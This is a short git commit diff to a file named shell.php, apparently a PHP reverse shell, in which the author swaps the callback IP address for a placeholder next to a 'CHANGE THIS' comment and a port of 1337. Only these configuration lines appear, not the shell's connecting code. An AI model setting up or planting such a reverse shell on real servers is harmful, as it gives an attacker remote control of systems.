a2b1e3e87348f3685d4b0e7b92889fab3520d350
Shehzad Roy <65858237+Shehzadcyber@users.noreply.github.com>
2023-02-28 16:36:31 +0500

    Update shell.php

--- shell.php
+++ shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.41.128';  // CHANGE THIS
+$ip = 'x.x.x.xx.x';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
